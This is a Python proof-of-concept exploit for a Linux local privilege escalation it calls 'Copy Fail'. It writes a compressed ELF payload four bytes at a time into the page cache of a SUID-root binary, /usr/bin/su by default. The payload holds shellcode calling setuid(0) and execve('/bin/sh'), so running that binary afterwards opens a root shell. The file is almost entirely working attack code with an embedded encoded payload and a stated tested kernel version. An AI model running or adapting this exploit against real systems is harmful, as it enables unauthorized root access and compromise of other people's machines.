#!/usr/bin/env python3
"""
Copy Fail — SUID binary ELF header overwrite
==============================================
Replaces the first 160 bytes of a SUID binary's page cache with a
minimal ELF containing shellcode that calls setuid(0) + execve("/bin/sh").

This is the technique used by the original public PoC (732-byte obfuscated
script by Xint Code Research Team). The target binary must be SUID root
so the kernel grants the setuid(0) system call.

After the overwrite, executing the SUID binary spawns a root shell.

Tested on: CentOS Stream 8, kernel 4.18.0-553.6.1.el8
"""
import os
import sys
import zlib
from copyfail_core import page_cache_write_4bytes

# Minimal ELF x86-64 (160 bytes) with shellcode:
#   setuid(0); execve("/bin/sh", NULL, NULL); exit(0)
# Compressed with zlib for compactness.
PAYLOAD_COMPRESSED = bytes.fromhex(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c"
    "301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10"
    "f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
)

DEFAULT_TARGET = "/usr/bin/su"


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET
    if not os.path.isfile(target):
        print(f"[-] {target} not found")
        sys.exit(1)

    # Check SUID bit
    st = os.stat(target)
    if not (st.st_mode & 0o4000):
        print(f"[!] Warning: {target} does not have SUID bit set")
        print(f"[!] Shellcode setuid(0) will fail without SUID")

    elf_payload = zlib.decompress(PAYLOAD_COMPRESSED)
    print(f"[*] Target: {target}")
    print(f"[*] Payload: {len(elf_payload)} bytes ({len(elf_payload)//4} writes)")

    fd = os.open(target, os.O_RDONLY)
    original_header = os.pread(fd, 16, 0)
    print(f"[*] Original ELF header: {original_header.hex()}")

    for offset in range(0, len(elf_payload), 4):
        chunk = elf_payload[offset : offset + 4]
        page_cache_write_4bytes(fd, offset, chunk)

    # Verify
    after = os.pread(fd, 16, 0)
    os.close(fd)

    if after[:4] == b'\x7fELF':
        print(f"[+] ELF header overwritten: {after.hex()}")
        print(f"[*] Execute '{target}' to get root shell")
        print(f"[*] Restore: echo 3 > /proc/sys/vm/drop_caches")
    else:
        print(f"[-] Unexpected result: {after.hex()}")


if __name__ == "__main__":
    main()
